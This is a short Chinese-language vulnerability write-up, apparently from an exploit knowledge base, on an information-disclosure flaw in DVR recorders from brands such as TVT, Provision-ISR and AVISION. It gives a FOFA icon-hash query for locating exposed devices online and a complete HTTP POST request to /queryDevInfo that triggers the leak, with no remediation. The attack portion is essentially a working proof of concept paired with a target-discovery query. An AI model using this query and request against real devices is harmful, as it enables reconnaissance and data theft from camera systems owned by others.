# DVR设备存在敏感信息泄露

# 一、漏洞简介
DVR（数字视频录像机）设备中，包括 TVT、Provision-ISR、AVISION 等品牌的机型。DVR设备存在敏感信息泄露

# 二、影响版本
+ DVR

# 三、资产测绘
+ fofa`icon_hash="492290497"`
+ 特征

![1727149378553-971d331b-6e62-4b21-ab6e-c4b8e03f3a3e.png](./img/gVa4We2SG_G-RXJD/1727149378553-971d331b-6e62-4b21-ab6e-c4b8e03f3a3e-936281.png)

# 四 、漏洞复现
```java
POST /queryDevInfo HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept-Language: en-US,en;q=0.9
Accept-Encoding": gzip, deflate
Accept: */*
Connection: keep-alive

<?xml version="1.0" encoding="utf-8" ?><request version="1.0" systemType="NVMS-9000" clientType="WEB"/>
```

![1727149406676-6a2a733e-7d04-4505-b9d1-dd1b57cd3a6b.png](./img/gVa4We2SG_G-RXJD/1727149406676-6a2a733e-7d04-4505-b9d1-dd1b57cd3a6b-731482.png)



> 更新: 2024-10-22 09:40:53  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/og9o95nb4rdos806>